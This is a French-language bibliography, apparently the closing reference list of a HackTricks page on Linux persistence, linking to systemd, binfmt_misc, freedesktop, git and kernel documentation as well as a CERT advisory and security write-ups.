- [15] [run-parts(8) — page de manuel Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentation du kernel Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associations des applications MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spécification Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spécification Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Langage Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001 : vulnérabilité du cache de pages AF_ALG du kernel Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB : Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentation Git de `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentation Git de `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentation de configuration Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — page de manuel Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentation des générateurs systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — ingénierie de détection Linux : mécanismes de persistance](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
